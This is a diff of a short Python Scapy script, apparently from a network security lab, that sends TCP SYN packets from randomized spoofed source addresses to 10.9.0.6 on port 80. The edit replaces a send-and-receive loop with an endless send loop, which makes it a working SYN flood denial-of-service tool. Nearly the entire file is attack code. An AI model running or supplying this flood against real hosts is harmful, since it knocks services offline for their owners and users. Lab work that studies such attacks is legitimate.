@@ -1,18 +1,19 @@
 from scapy.all import *
 from ipaddress import IPv4Address
 from random import getrandbits
+import random
 
 target_ip = "10.9.0.6"
 target_port = 80
 
 ip = IP(src=RandIP("10.9.0.0/24"), dst=target_ip)
 
-tcp = TCP(sport=RandShort(), dport=target_port, flags="S", seq=100)
+tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
 
-raw = Raw(b"Mustafa")
-
+raw = Raw(b"AAbdullah")
 p = ip/tcp/raw
-srloop(p,verbose=0,inter=0.03)
+while True:		
+	send(p, loop=1, verbose=0)
 
 #DEST_IP = "10.9.0.6"
 
